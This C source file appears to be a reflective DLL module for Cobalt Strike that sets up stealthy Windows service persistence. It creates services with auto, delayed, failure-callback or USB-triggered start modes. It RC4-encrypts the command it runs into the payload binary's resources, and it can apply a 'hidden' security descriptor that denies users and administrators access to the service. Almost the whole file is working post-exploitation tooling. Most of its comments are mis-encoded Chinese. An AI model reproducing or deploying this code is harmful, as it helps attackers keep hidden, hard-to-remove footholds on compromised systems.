//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include <windows.h> 
#include <stdio.h>
#include <stdlib.h>
#include <sddl.h>
static  char* ServiceName;
static  char* DisplayName;
#define BURSIZE 2048

/// <summary>
/// ��鵱ǰ�û��Ƿ�ΪSYSTEM
/// </summary>
/// <returns>SYSTEM -> TRUE </returns>
BOOL CurrentUserIsLocalSystem()
{
	BOOL bIsLocalSystem = FALSE;
	PSID psidLocalSystem;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

	BOOL fSuccess = AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
	if (fSuccess)
	{
		fSuccess = CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
		FreeSid(psidLocalSystem);
	}
	return bIsLocalSystem;
}

/// <summary>
/// ���ݴ�����룬���ش�������
/// </summary>
/// <param name="Text">Ҫ������ַ���</param>
/// <returns>���ش�������</returns>
PCSTR _FormatErrorMessage(char* Text)
{
	DWORD nErrorNo = GetLastError(); // �õ��������
	LPSTR lpBuffer;
	DWORD dwLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,
		nErrorNo,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language,
		(LPTSTR)&lpBuffer,
		0,
		NULL);
	if (dwLen == 0)
	{
		printf("[-] FormatMessage failed with %u\n", GetLastError());
	}
	if (lpBuffer) {
		printf("%s,ErrorCode:%u,Reason:%s", Text, nErrorNo, (LPCTSTR)lpBuffer);
	}
	return 0;
}

/// <summary>
/// RC4����
/// </summary>
/// <param name="Data">Դ����</param>
/// <param name="Length">Դ���ݳ���</param>
/// <param name="Key">key.Ĭ��ȡ�������� PROCESSOR_REVISION</param>
/// <param name="KeyLength">key�ĳ���</param>
void StreamCrypt(char* Data, long Length, char* Key, int KeyLength)
{
	int i = 0, j = 0;
	char k[256] = { 0 }, s[256] = { 0 };
	char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i % KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	int l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}


char* Getenv(char * ennv) {
	char* d = "123456";
	char* buf = NULL;
	size_t sz = 0;
	if (_dupenv_s(&buf, &sz, ennv) == 0 && buf != NULL)
	{
		return buf;
	}
	else {
		return 	d;
	}
}


/// <summary>
/// ����Դ��Ϣ�����Ҫִ�е�����
/// </summary>
/// <param name="outpath">Ҫд����Դ��Ϣ���ļ�</param>
/// <param name="exepath">Ҫִ�е�����</param>
/// <returns>�ɹ�����1����������0</returns>
BOOL AddResource(char* outpath, char* exepath)
{
	StreamCrypt(exepath, strlen(exepath), Getenv("PROCESSOR_REVISION"), strlen(Getenv("PROCESSOR_REVISION")));
	char Path[256] = { 0 };
	strcpy_s(Path, 256, exepath);
	HANDLE  hResource = BeginUpdateResource(outpath, FALSE);
	if (NULL != hResource)
	{
		if (UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(100), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), Path, strlen(Path)) != FALSE)
		{
			EndUpdateResource(hResource, FALSE);
			printf("[+] EndUpdateResource successfuly.\n");
			return 1;
		}
		else {
			_FormatErrorMessage("[-] д����Դ�ļ�ʧ��");
		}
	}
	return 0;
}


/// <summary>
/// HEXתASCLL
/// </summary>
/// <param name="c"></param>
/// <returns></returns>
int hex2dec(char c)
{
	if ('0' <= c && c <= '9')
	{
		return c - '0';
	}
	else if ('a' <= c && c <= 'f')
	{
		return c - 'a' + 10;
	}
	else if ('A' <= c && c <= 'F')
	{
		return c - 'A' + 10;
	}
	else
	{
		return -1;
	}
}

/// <summary>
/// ����URL���޸�Դ�ڴ�
/// </summary>
/// <param name="url">URL������Ϣ</param>
void urldecode(char url[])
{
	int i = 0;
	int len = strlen(url);
	int res_len = 0;
	char res[BURSIZE];
	for (i = 0; i < len; ++i)
	{
		char c = url[i];
		if (c != '%')
		{
			res[res_len++] = c;
		}
		else
		{
			char c1 = url[++i];
			char c0 = url[++i];
			int num = 0;
			num = hex2dec(c1) * 16 + hex2dec(c0);
			res[res_len++] = num;
		}
	}
	res[res_len] = '\0';
	strcpy_s(url, BURSIZE, res);
}


/// <summary>
/// ����ļ��Ƿ����
/// </summary>
/// <param name="lpFileName">filepath</param>
/// <returns>���ڷ���TRUE,ʧ�ܷ���FALSE</returns>
BOOL IsFileExist(LPCTSTR lpFileName)
{
	if (!lpFileName)
		return FALSE;
	DWORD dwAttr = GetFileAttributes(lpFileName);
	if (INVALID_FILE_ATTRIBUTES == dwAttr || (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
		return FALSE;
	return TRUE;
}

/// <summary>
/// ������ơ���������
/// </summary>
/// <param name="lpszDriverPath">�������</param>
/// <param name="iOperateType">0 ���ط��� 1 �������� 2 ֹͣ���� 3 ɾ������</param>
/// <param name="sdli">sddl����</param>
/// <param name="Describe">��������</param>
/// <param name="StartType">�������������,�Զ����ֶ���������������ʧ�ܻص�</param>
/// <param name="cmdline">Ҫִ�е�����</param>
/// <returns></returns>
BOOL SystemServiceOperate(char* lpszDriverPath, int iOperateType, int sdli, char* Describe, char* StartType, char* cmdline)
{
	BOOL bRet = TRUE;
	SERVICE_STATUS sStatus;
	SC_HANDLE shSCManager = NULL, shService = NULL;
	char* sddlstr;
	if (1 == sdli) {
		sddlstr = "O:BAD:(A;;GA;;;SY)(D;;GA;;;IU)(D;;GA;;;LA)(D;;GA;;;LS)";   //deny
	}
	else if (2 == sdli) {
		sddlstr = "O:BAD:(A;;GA;;;SY)(A;;GR;;;IU)(A;;GR;;;LA)(A;;GR;;;LS)";   //Read
	}
	else {
		sddlstr = "O:BAD:(A;;GA;;;SY)(A;;GA;;;IU)(A;;GA;;;LA)(A;;GA;;;LS)";   //Allow
	}

	shSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (0 != iOperateType)
	{
		shService = OpenService(shSCManager, ServiceName, SERVICE_ALL_ACCESS);
		if (!shService)
		{
			_FormatErrorMessage("[-] OpenService Failed(maybe you are not system)");
			goto cleanup;
		}
	}
	switch (iOperateType)
	{
	case 0:
	{
		//��������
		SERVICE_DESCRIPTION lpDescription = { Describe };

		//������,����Ӳ���豸ʱ: Hardware ID generated by the USB storage port driver
		wchar_t szDeviceData[] = L"USB";
		// Allocate and set the SERVICE_TRIGGER_SPECIFIC_DATA_ITEM structure
		SERVICE_TRIGGER_SPECIFIC_DATA_ITEM deviceData = { 0 };
		deviceData.dwDataType = SERVICE_TRIGGER_DATA_TYPE_STRING;
		deviceData.cbData = wcslen(szDeviceData) * sizeof(WCHAR);
		deviceData.pData = (BYTE*)szDeviceData;
		// Allocate and set the SERVICE_TRIGGER structure
		SERVICE_TRIGGER serviceTrigger = { 0 };
		serviceTrigger.dwTriggerType = SERVICE_TRIGGER_TYPE_DEVICE_INTERFACE_ARRIVAL;
		serviceTrigger.dwAction = SERVICE_TRIGGER_ACTION_SERVICE_START;
		char* GUIDS = "53F56307-B6BF-11D0-94F2-00A0C91EFB8B";
		serviceTrigger.pTriggerSubtype = (GUID*)GUIDS;
		serviceTrigger.cDataItems = 1;
		serviceTrigger.pDataItems = &deviceData;
		// Allocate and set the SERVICE_TRIGGER_INFO structure
		SERVICE_TRIGGER_INFO serviceTriggerInfo = { 0 };
		serviceTriggerInfo.cTriggers = 1;
		serviceTriggerInfo.pTriggers = &serviceTrigger;

		//������ʱ����
		SERVICE_DELAYED_AUTO_START_INFO DelayAutoRun = { 0 };
		DelayAutoRun.fDelayedAutostart = TRUE;

		//��������ʧ�ܻص�����
		SERVICE_FAILURE_ACTIONS sdBuf = { 0 };
		SC_ACTION action[1];
		action[0].Delay = 5 * 1000;
		action[0].Type = SC_ACTION_RUN_COMMAND;
		sdBuf.lpCommand = cmdline;
		sdBuf.lpRebootMsg = NULL;
		sdBuf.dwResetPeriod = 1;
		sdBuf.cActions = 1;
		sdBuf.lpsaActions = action;

		// SDDL
		PSECURITY_DESCRIPTOR sDescriptor = { 0 };

		printf("[+] StartType = %s\n", StartType);
		//SERVICE_AUTO_START ��ϵͳ����
		if (strcmp(StartType, "SERVICE_AUTO_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}// SERVICE_DEMAND_START �ֶ�����
		else if (strcmp(StartType, "SERVICE_DEMAND_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}//����ʧ�ܵĻص�
		else if (strcmp(StartType, "SERVICE_Callback_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}//��ʱ����
		else if (strcmp(StartType, "SERVICE_CONFIG_DELAYED_AUTO_START_INFO") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_AUTO_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}//����������
		else if (strcmp(StartType, "SERVICE_HD_START") == 0) {
			shService = CreateService(shSCManager, ServiceName, DisplayName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS, // SERVICE_INTERACTIVE_PROCESS
				SERVICE_DEMAND_START,
				SERVICE_ERROR_IGNORE,
				lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		}
		else {
			printf("[-] StartType not in function.\n");
			goto cleanup;
		}

		if (shService) {
			//����������Ϣ
			if (!ChangeServiceConfig2(shService, SERVICE_CONFIG_DESCRIPTION, &lpDescription)) {
				_FormatErrorMessage("[-] ChangeServiceConfig2 Description failed");
				goto cleanup;
			}

			//��������ʧ���¼�
			if (strcmp(StartType, "SERVICE_Callback_START") == 0) {
				if (!ChangeServiceConfig2(shService, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf)) {
					_FormatErrorMessage("[-] ��������ʧ�ܻص�");
					goto cleanup;
				}
				else {
					printf("[+] Set CallbackRun Successfully\n");
				}
			}
			//������ʱ��������
			if (strcmp(StartType, "SERVICE_CONFIG_DELAYED_AUTO_START_INFO") == 0) {
				if (!ChangeServiceConfig2(shService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &DelayAutoRun)) {
					_FormatErrorMessage("[-] ������ʱ����ʧ��");
					goto cleanup;
				}
				else {
					printf("[+] Set Delayed Start Successfully\n");
				}
			}

			//���ô�������������(Ӳ���ӿ���)
			if (strcmp(StartType, "SERVICE_HD_START") == 0) {
				if (!ChangeServiceConfig2W(shService, SERVICE_CONFIG_TRIGGER_INFO, &serviceTriggerInfo)) {
					_FormatErrorMessage("[-] ���ô���������ʧ��");
					goto cleanup;
				}
				else {
					printf("[+] Set Delayed Start Successfully\n");
				}
			}

			//Ĭ�ϲ�����SDDL
			if (sdli) {
				//����SDDL
				if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddlstr, SDDL_REVISION_1, &sDescriptor, NULL)) { //�ܾ�����ʽ�û�����Ȩ�ޡ���չ����ص��ļ�����Ȩ�ޣ����˿�����
					_FormatErrorMessage("[-] ConvertStringSecurityDescriptorToSecurityDescriptor error");
					goto cleanup;
				}
				else {
					printf("[+] ConvertStringSecurityDescriptorToSecurityDescriptor successfully\n");
				}
				if (!SetServiceObjectSecurity(shService, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, sDescriptor)) {
					_FormatErrorMessage("[-] SetServiceObjectSecurity error");
					goto cleanup;
				}
				else {
					printf("[+] Service SDDL set successfully\n");
				}
			}
		}
		else {
			_FormatErrorMessage("[-] CreateService failed");
			goto cleanup;
		}
		break;
	}
	case 1:
	{
		// ��������
		StartService(shService, 0, NULL);	return TRUE;
		break; return TRUE;
	}
	case 2:
	{
		// ֹͣ����
		ControlService(shService, SERVICE_CONTROL_STOP, &sStatus);
		break;	return TRUE;
	}
	case 3:
	{
		// ɾ������
		DeleteService(shService);
		break;	return TRUE;
	}
	default:
		break;	return TRUE;
	}
	//�رվ��
	if (NULL != shSCManager)
		CloseServiceHandle(shSCManager);
	if (NULL != shService)
		CloseServiceHandle(shService);
	return TRUE;

cleanup:
	if (NULL != shSCManager)
		CloseServiceHandle(shSCManager);
	if (NULL != shService)
		CloseServiceHandle(shService);
	return FALSE;
}


/// <summary>
///  ��������
/// </summary>
/// <param name="Argvs">Argvs Cobalt sting</param>
/// <returns></returns>
BOOL ServiceMain(char* Argvs) {
	BOOL bRet = FALSE;
	char dest[4096];   //����������
	memset(dest, '\0', sizeof(dest));
	int sdli = 0;
	const char s[2] = "|";  //�ָ���
	char* next_token = NULL;
	char* Parame, * szFileName = NULL, * evilName = NULL, * Describe = NULL, * StartType = NULL, * SDL = NULL, * Dotype = NULL, * cmdline = NULL;
	Parame = Argvs;
	size_t len = strlen(Parame);

	if (len > sizeof(dest)) {
		printf("[-] ����,��ǰ����Ϊ %d ,��������� %d �ֽڡ�\n", len, len - sizeof(dest));
		return FALSE;
	}
	strcpy_s(dest, 4096, Parame);

	ServiceName = strtok_s(dest, s, &next_token);  //������
	DisplayName = strtok_s(NULL, s, &next_token);  //��ʾ��
	szFileName = strtok_s(NULL, s, &next_token);   //�غɷ������,�������ڲ�ִ�ж����ļ�
	evilName = strtok_s(NULL, s, &next_token);     //�����ļ�,���ڼ���ļ��Ƿ����
	cmdline = strtok_s(NULL, s, &next_token);      //Ҫִ�е�����
	Describe = strtok_s(NULL, s, &next_token);     //���������
	StartType = strtok_s(NULL, s, &next_token);    //�������������,�Զ����ֶ���������������ʧ�ܻص�
	SDL = strtok_s(NULL, s, &next_token);          //��ȫ������
	Dotype = strtok_s(NULL, s, &next_token);       //ֹͣ��������ɾ��

	if (ServiceName != NULL && DisplayName != NULL && szFileName != NULL && Describe != NULL && StartType != NULL && SDL != NULL && Dotype != NULL)
	{
		
		urldecode(ServiceName);
		urldecode(DisplayName);
		urldecode(Describe);

		printf("[*] ��������: %s\n", ServiceName);
		printf("[*] ��ʾ����: %s\n", DisplayName);
		printf("[*] �����ļ�: %s\n", szFileName);
		printf("[*] �����ļ�: %s\n", evilName);
		printf("[*] ִ������: %s\n", cmdline);
		printf("[*] ��������: %s\n", Describe);
		printf("[*] ��������: %s\n", StartType);
		printf("[*] SDDL: %s\n", SDL);
		printf("[*] ��ǰ����: %s\n", Dotype);

		if (strcmp(SDL, "hidden") == 0) {
			sdli = 1;
		}
		else if (strcmp(SDL, "read") == 0)
		{
			sdli = 2;
		}
		if (sdli) {
			if (CurrentUserIsLocalSystem()) {
				printf("[+] Run As SYSTEM.\n");
			}
			else {
				printf("[-] Not Run As SYSTEM.\n");
				return FALSE;
			}
		}
		if (!IsFileExist(szFileName)) {
			printf("[-] �ļ�: %s ������.\n", szFileName);
			return FALSE;
		}
		if (!IsFileExist(evilName)) {
			printf("[-] �ļ�: %s ������.\n", evilName);
			return FALSE;
		}

		//����������������
		if (strcmp(Dotype, "start") == 0) {
			//�Բ��ǻص��������в�����ʹ��RC4���ܲ�д�����������Դ��
			if (strcmp(StartType, "SERVICE_Callback_START") != 0) {
				if (!AddResource(szFileName, cmdline))
				{
					_FormatErrorMessage("[-] AddResource Error,");
					return FALSE;
				}
				else {
					printf("[+] AddResource Successfully!\n");
				}
			}

			bRet = SystemServiceOperate(szFileName, 0, sdli, Describe, StartType, cmdline);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Create Error");
				return FALSE;
			}
			bRet = SystemServiceOperate(szFileName, 1, 0, 0, 0, 0);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Start Error");
				return FALSE;
			}
			//�Բ��ǻص����͵������н��ܶԱ�
			if (strcmp(StartType, "SERVICE_Callback_START") != 0) {
				StreamCrypt(cmdline, strlen(cmdline), Getenv("PROCESSOR_REVISION"), strlen(Getenv("PROCESSOR_REVISION")));
			}
			printf("[+] ServiceName: %s\n", ServiceName);
			printf("[+] TransitPathName: %s\n", szFileName);
			printf("[+] Cmdline: %s\n", cmdline);
			printf("[+] Success! Service successfully Create and Start.\n");
		}
		//ֹͣ����ɾ������
		else if (strcmp(Dotype, "stop") == 0)
		{
			bRet = SystemServiceOperate(szFileName, 2, 0, 0, 0, 0);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Stop Error,");
				return FALSE;
			}
			bRet = SystemServiceOperate(szFileName, 3, 0, 0, 0, 0);
			if (FALSE == bRet)
			{
				_FormatErrorMessage("[-] Delete Error,");
				return FALSE;
			}
			printf("[+] ServiceName: %s\n", ServiceName);
			printf("[+] TransitPathName: %s\n", szFileName);
			printf("[+] EvilPathName: %s\n", evilName);
			printf("[+] Success! Service successfully Stop and Delete.\n");
		}
		else {
			printf("[-] ��������\n");
			return FALSE;
		}
	}
	return TRUE;
}

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
	{
		hAppInstance = hinstDLL;
		/* print some output to the operator */

		if (lpReserved != NULL) {
			if (ServiceMain((char*)lpReserved)) {
				printf("[+] Done.\n");
			}
			else {
				printf("[-] Failed.\n");
			}
		}
		else
		{
			printf("[-] NULL of parameters! Check your input.\n");
		}
		fflush(stdout);
		ExitProcess(0);
		break;
	}
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
}